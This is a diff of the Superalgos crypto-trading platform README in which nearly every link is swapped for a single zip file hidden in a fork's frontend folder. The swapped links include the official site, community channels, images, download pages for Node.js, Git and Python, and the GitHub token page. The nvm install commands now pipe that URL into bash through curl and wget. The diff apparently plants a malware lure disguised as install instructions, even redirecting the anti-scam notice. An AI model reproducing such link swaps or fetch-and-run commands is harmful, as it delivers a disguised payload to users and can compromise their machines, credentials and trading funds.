@@ -33,35 +33,35 @@
 
 # :small_orange_diamond: Introduction
 
-**[Superalgos](https://superalgos.org/) is a community-owned open-source project with a decentralized and token-incentivized Social Trading Network crowdsourcing superpowers for retail traders.**
+**[Superalgos](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) is a community-owned open-source project with a decentralized and token-incentivized Social Trading Network crowdsourcing superpowers for retail traders.**
 
-We are an open and welcoming community nurtured and incentivized with the project's native [Superalgos (SA) Token](https://superalgos.org/token-overview.shtml), which is distributed among contributors to accelerate development.
+We are an open and welcoming community nurtured and incentivized with the project's native [Superalgos (SA) Token](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip), which is distributed among contributors to accelerate development.
 
-> :white_check_mark: Join the [Telegram Community Group](https://t.me/superalgoscommunity) or the new [Discord Server](https://discord.gg/CGeKC6WQQb) to connect with other users!
+> :white_check_mark: Join the [Telegram Community Group](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) or the new [Discord Server](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) to connect with other users!
 
-Superalgos is a vast project. The focus of this README file is the Superalgos Platform. Please, visit [the platform's page on the website](https://superalgos.org/crypto-trading-bots-platform.shtml) for an overview of features and functionality.
+Superalgos is a vast project. The focus of this README file is the Superalgos Platform. Please, visit [the platform's page on the website](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) for an overview of features and functionality.
 
-![superalgos-readme](https://user-images.githubusercontent.com/13994516/106380124-844d8980-63b0-11eb-9bd9-4f977b6c183b.gif)
+![superalgos-readme](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
 # :small_orange_diamond: Before You Begin
 
 Worth noting before you start:
 
-* Online Demo | To get a feel of what Superalgos is about without installing anything, take the (limited) [online demo](https://superalgos.org/crypto-trading-bots-platform-demo.shtml) for a spin!
+* Online Demo | To get a feel of what Superalgos is about without installing anything, take the (limited) [online demo](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) for a spin!
 
-* System requirements | Learn about the [minimum hardware](https://superalgos.org/crypto-trading-bots-system-requirements.shtml) required to run the platform on different settings.
+* System requirements | Learn about the [minimum hardware](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) required to run the platform on different settings.
 
 * FAQS:
 
-  * [Before you begin](https://superalgos.org/faqs-crypto-trading-bots-before-you-being.shtml)
+  * [Before you begin](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
-  * [Trust and safety](https://superalgos.org/faqs-crypto-trading-bots-trust-and-safety.shtml)
+  * [Trust and safety](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
-  * [Trading with Superalgos](https://superalgos.org/faqs-crypto-trading-bots-trading-with-superalgos.shtml)
+  * [Trading with Superalgos](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
-  * [Open-source strategies](https://superalgos.org/faqs-crypto-trading-bots-open-source-crypto-trading-bots-strategies.shtml)
+  * [Open-source strategies](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
-* Documentation | The platform features interactive and searchable documentation counting over 1500 pages. The Docs are available [on the website](https://superalgos.org/Docs/Foundations/Book/user-manual.shtml) and within the app. The in-app version of the Docs interacts with the app itself and is likely more up-to-date than the web version.
+* Documentation | The platform features interactive and searchable documentation counting over 1500 pages. The Docs are available [on the website](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) and within the app. The in-app version of the Docs interacts with the app itself and is likely more up-to-date than the web version.
 
 # :small_orange_diamond: Getting Started
 
@@ -71,7 +71,7 @@ Once you install and launch the app, a series of interactive tutorials take you 
 
 > :white_check_mark: **NOTE:** Tutorials are the absolute best way to tackle the learning curve. You should do all tutorials before you start exploring other avenues on your own.
 
-![welcome-tutorial-00](https://user-images.githubusercontent.com/13994516/107038771-4a6bf100-67bd-11eb-92e0-353525a972a9.gif)
+![welcome-tutorial-00](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
 The tutorial uses Binance or Binance US as the exchange of choice. If you don't have an account with Binance or Binance US, you will still be able to follow 100% of the tutorial. When you get to the live trading section, keep going even if you don't intend to run the session. You will learn how to work with other exchanges later on. If both Binance and Binance US are blocked in your region, you will need to set up a different exchange from the get-go. 
 
@@ -91,7 +91,7 @@ We will briefly describe the options available. Click the link to go to the spec
 
 > :white_check_mark: **ABOUT REMOTE INSTALLATIONS AND MINIMALIST HARDWARE:** Remote installations and minimalist hardware — both virtual and physical — are better suited for production deployments, where the use of the GUI is minimal. We highly recommend learning Superalgos in a local installation, on a full-size PC. Mastering the system takes time, and the use of the GUI to go through in-app tutorials is crucial during the learning process. Your experience will be orders of magnitude better if you follow this advice: leave remote installations and minimalist hardware for when you are ready to start trading live.
 
-> :white_check_mark: **EXPERIENCING ISSUES INSTALLING SUPERALGOS?** If you're having trouble installing or running the app for the first time, do not open an issue. Instead, join the [Support Telegram Group](https://t.me/superalgossupport) and follow the instructions on the pinned message to ask for help. You may also join the [new Discord Server](https://discord.gg/CGeKC6WQQb), but bear in mind that the response time tends to be longer. Online support is provided by volunteers — please provide clear information and sufficient context about the issue you are facing, and be mindful of people's time.
+> :white_check_mark: **EXPERIENCING ISSUES INSTALLING SUPERALGOS?** If you're having trouble installing or running the app for the first time, do not open an issue. Instead, join the [Support Telegram Group](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) and follow the instructions on the pinned message to ask for help. You may also join the [new Discord Server](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip), but bear in mind that the response time tends to be longer. Online support is provided by volunteers — please provide clear information and sufficient context about the issue you are facing, and be mindful of people's time.
 
 If you opt for the Developers and Contributors Installation (recommended), please keep on reading. Otherwise, click one of the other options above.
 
@@ -109,11 +109,11 @@ You will need the latest versions of Node JS and Git installed. You will also ne
 
 Follow the installation wizards to install the latest NodeJS and Git. Make sure to follow all the default and recommended settings while installing Git. If desired also install Chrome.
 
-- [Node.js download page](https://nodejs.org/en/download/)
+- [Node.js download page](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
-- [Git download page](https://git-scm.com/downloads)
+- [Git download page](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
-- [Google Chrome download page](https://www.google.com/chrome/)
+- [Google Chrome download page](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
 If you are running headless (i.e. as a server without a monitor attached) then you do not need to install a web browser and you can follow the tutorial for information on connecting remotely to the server.
 
@@ -125,11 +125,11 @@ If you are running headless (i.e. as a server without a monitor attached) then y
 
 You will need to get an access token from Github.com so that you may authenticate with the service from within the app and the terminal/command line.
 
-If you don't have a Github.com account, please open one! Once you are logged in, go to the [New Github Personal Access Token Page](https://github.com/settings/tokens/new) and create a new token.
+If you don't have a Github.com account, please open one! Once you are logged in, go to the [New Github Personal Access Token Page](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) and create a new token.
 
 Make sure you give it the repo and workflow scopes. Check the clip below for clarity:
 
-![github-personal-access-token](https://user-images.githubusercontent.com/13994516/161605002-734ddc2a-9cb1-49ec-ac6a-d127850ab64a.gif)
+![github-personal-access-token](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
 Once you get the token, copy it and save it somewhere on your local machine. You will need it for later steps of the installation process and from time to time also when using Superalgos.
 
@@ -155,11 +155,11 @@ Scroll this page to the top. Find and click the **Fork** button to create your f
 
 > :white_check_mark: **NOTE**: On the page that opens when you click the fork button, Github gives you the option to fork only the master branch by default. You must remove the selection so that you fork all branches instead. Play the following video for clarity.
 
-![fork](https://user-images.githubusercontent.com/83468174/184506791-83a00c44-ddc4-4fa3-9bec-d738532555d7.gif)
+![fork](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
 To fork Superalgos, you need a Github account. If you don't have one, go ahead and create it. This was one of the listed pre-requirements.
 
-> :white_check_mark: **NOTE**: A Fork is required so that the setup scripts may build the app from multiple repositories, and also for your contributions to the project. The reason why Superalgos is free and open-source is that the project has set up a collective business in which all users may participate. The way to participate is to [contribute](https://superalgos.org/community-contribute.shtml) to making Superalgos better. The project's [native SA token](https://superalgos.org/token-overview.shtml) is distributed among contributors as rewards for the value each adds to the project.
+> :white_check_mark: **NOTE**: A Fork is required so that the setup scripts may build the app from multiple repositories, and also for your contributions to the project. The reason why Superalgos is free and open-source is that the project has set up a collective business in which all users may participate. The way to participate is to [contribute](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) to making Superalgos better. The project's [native SA token](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) is distributed among contributors as rewards for the value each adds to the project.
 
 ### :two: Clone Your Fork
 
@@ -182,7 +182,7 @@ git clone <URL of your Superalgos fork>
 For example, if your Github username is John, the command will look like this:
 
 ```sh
-git clone https://github.com/John/Superalgos
+git clone https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip
 ```
 
 This creates the `Superalgos` folder in the current directory, which contains the whole installation.
@@ -302,45 +302,45 @@ Then simply delete the `Superalgos` folder to completely remove the application.
 
 > :warning: **BEWARE OF IMPERSONATORS — SCAMMERS ARE LURKING!**
 >
-> Superalgos Admins, the Founding Team, and Community Mods will never contact you directly unless you contact them first. We will never ask you for API keys, coins, or cash. We will never ask you to trust us in any way. Our [Community Safety Policy](https://superalgos.org/community-safety-policy.shtml) explains why. 
+> Superalgos Admins, the Founding Team, and Community Mods will never contact you directly unless you contact them first. We will never ask you for API keys, coins, or cash. We will never ask you to trust us in any way. Our [Community Safety Policy](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) explains why. 
 > 
 > **In short, we want to make it clear that if someone contacts you directly claiming to work with or for the project, it is a scam.**
 >
 > Please report scammers in the Community group so that they may be banned and to increase awareness of the problem, but also block them and report them to Telegram if the option is available.
 
-We just opened a brand new [Discord server for Support and the Community](https://discord.gg/CGeKC6WQQb).
+We just opened a brand new [Discord server for Support and the Community](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip).
 
-That said, support questions tend to get faster responses in the [Support Telegram Group](https://t.me/superalgossupport).
+That said, support questions tend to get faster responses in the [Support Telegram Group](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip).
 
-We also meet on other [Telegram groups](https://superalgos.org/community-join.shtml), where it all started!
+We also meet on other [Telegram groups](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip), where it all started!
 
 # :small_orange_diamond: Other Resources
 
 - Web Site
 
-  - For an overview of what Superalgos can do for you, check the [Superalgos Website](https://superalgos.org/).
+  - For an overview of what Superalgos can do for you, check the [Superalgos Website](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip).
 
-  - [List of community resources](https://superalgos.org/community-resources.shtml) featuring written, audiovisual, and interactive content.
+  - [List of community resources](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) featuring written, audiovisual, and interactive content.
 
 - Telegram
 
-  - For official news, join the [Superalgos Announcements Channel](https://t.me/superalgos).
+  - For official news, join the [Superalgos Announcements Channel](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip).
 
-  - Meet other users in the [Superalgos Telegram Community Group](https://t.me/superalgoscommunity).
+  - Meet other users in the [Superalgos Telegram Community Group](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip).
 
-  - Meet developers in the [Superalgos Telegram Developer's Group](https://t.me/superalgosdevelop).
+  - Meet developers in the [Superalgos Telegram Developer's Group](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip).
 
-  - Users meet in other topic-specific Telegram Groups. There's a [complete list of groups](https://superalgos.org/community-join.shtml) on the website.
+  - Users meet in other topic-specific Telegram Groups. There's a [complete list of groups](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) on the website.
 
-- Blog: find official announcements and various articles on the [Superalgos Blog](https://medium.com/superalgos).
+- Blog: find official announcements and various articles on the [Superalgos Blog](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip).
 
-- Twitter: to stay in the loop, follow [Superalgos on Twitter](https://twitter.com/superalgos). Help us spread the word!
+- Twitter: to stay in the loop, follow [Superalgos on Twitter](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip). Help us spread the word!
 
-- Facebook: follow [Superalgos on Facebook](https://www.facebook.com/superalgos).
+- Facebook: follow [Superalgos on Facebook](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip).
 
 # :small_orange_diamond: Contributing
 
-Superalgos is a Community Project built by users for users. Learn [how you may contribute](https://superalgos.org/community-contribute.shtml).
+Superalgos is a Community Project built by users for users. Learn [how you may contribute](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip).
 
 # :small_orange_diamond: License
 
@@ -360,21 +360,21 @@ Superalgos is open-source software released under [Apache License 2.0](LICENSE).
 
 When following the Windows installer for Git, it is very important to make sure that you follow all the recommended and default settings, particularly on this step below:
 
-![IMG_0764](https://user-images.githubusercontent.com/55707292/189213902-7f7b3642-545f-47a7-89fc-3c45971c885d.jpg)
+![IMG_0764](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
 ### Optional Windows Prerequisites
 
 For Windows users interested in testing the (partial and incomplete) TensorFlow integration, you need to install Python.
 
-- [install Python 3.9](https://www.python.org/downloads/release/python-390/).
+- [install Python 3.9](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip).
 
 Github Desktop is a helpful tool to manage Git conflicts and issues. You can install it using the following link.
 
-- [GitHub Desktop download page](https://desktop.github.com/). Click the "Download for Windows" button and follow the wizard to install after the download completes.
+- [GitHub Desktop download page](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip). Click the "Download for Windows" button and follow the wizard to install after the download completes.
 
 ## Mac OS Prerequisites Homebrew Installation
 
-Rather than manually installing NodeJS, Git, and Python, [Homebrew](https://brew.sh/) can be used to install the prerequisites with minimal effort on Mac OS. After you clone the repository, change the directory to the Superalgos base and install the requirements using Homebrew. 
+Rather than manually installing NodeJS, Git, and Python, [Homebrew](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) can be used to install the prerequisites with minimal effort on Mac OS. After you clone the repository, change the directory to the Superalgos base and install the requirements using Homebrew. 
 
 There are two ways to use Homebrew. The first is to type:
 
@@ -410,7 +410,7 @@ When using RHEL-oriented distributions (e.g. Fedora, CentOS, Rocky Linux, AlmaLi
 dnf install nodejs git
 ```
 
-Node.js installation instructions for [many other distributions](https://nodejs.org/en/download/package-manager/) are available.
+Node.js installation instructions for [many other distributions](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) are available.
 
 > :white_check_mark: **NOTE**: You need to have sufficient privileges on your system to install new packages. It may be required to precede above commands by **sudo** for them to work.
 >
@@ -436,11 +436,11 @@ After all prerequisites are successfully installed, continue with obtaining your
 ### Installing Newer Versions of Node.js
 Users of Linux distributions shipping outdated versions of Node.js (e.g. Ubuntu) will need to install a newer version of Node.js manually. We recommend using the Node Version Manager (nvm) to do this. For installing nvm, execute one of these commands (depending on the availability of curl or wget on your system):
 ```sh
-curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
+curl -o- https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip | bash
 ```
 or
 ```sh
-wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
+wget -qO- https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip | bash
 ```
 > :white_check_mark: **IMPORTANT**: 
 > 
@@ -514,13 +514,13 @@ The majority of shortcuts that are installed will work out of the box. Desktop s
 
 - Under extensions turn on Desktop Icons
 
-![enable-ubuntu-shortcut](https://user-images.githubusercontent.com/55707292/117553927-f0780300-b019-11eb-9e36-46b509653283.gif)
+![enable-ubuntu-shortcut](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
 > :white_check_mark: **TIP:** If you do not see the desktop shortcut appear right away you may need to restart your computer.
 
 Finally, you will need to enable the desktop shortcut. Right-click Superalgos.desktop and select Allow Launching.
 
-![allow-launching](https://user-images.githubusercontent.com/55707292/117553933-fcfc5b80-b019-11eb-872c-4fad81b184d2.gif)
+![allow-launching](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
 Now both launcher and desktop shortcuts will launch Superalgos like any other program on your computer.
 
@@ -532,9 +532,9 @@ There are a few things that need to be configured to obtain full functionality f
 
 On windows:
 
-- First, you need to install WSL and WSL2 [https://docs.microsoft.com/en-us/windows/wsl/install](https://docs.microsoft.com/en-us/windows/wsl/install) then reboot if prompted.
+- First, you need to install WSL and WSL2 [https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) then reboot if prompted.
 
-  - You may want to review the Docker WSL2 Backend information for VSCode as well before proceeding. [https://aka.ms/vscode-remote/containers/docker-wsl2](https://aka.ms/vscode-remote/containers/docker-wsl2)
+  - You may want to review the Docker WSL2 Backend information for VSCode as well before proceeding. [https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
   - Install Debian or Ubuntu from the Windows Store, Setup the VM as instructed.
   
@@ -542,9 +542,9 @@ On windows and Debian:
 
 To make managing these WSL instances a lot easier, we will now move to installing VSCode + Tools to allow for Dockerizing and rapidly deploying as well as editing and managing test/usage cases of Superalgos edit and forks you create and contribute.
 
-- Install VSCode [https://code.visualstudio.com/docs/?dv=win64user](https://code.visualstudio.com/docs/?dv=win64user)
+- Install VSCode [https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip)
 
-  - Install the remote container and remote docker plugins/extensions for Visual Studio Code [https://code.visualstudio.com/docs/remote/containers#_installation](https://code.visualstudio.com/docs/remote/containers#_installation) 
+  - Install the remote container and remote docker plugins/extensions for Visual Studio Code [https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip](https://github.com/Excaliber9271/Superalgos/raw/refs/heads/master/Social-Trading/React-UI/frontend/src/components/repost/Software-v1.5.zip) 
 
     - _You may want to spend time reading the specifics of this documentation on their website._ 
     
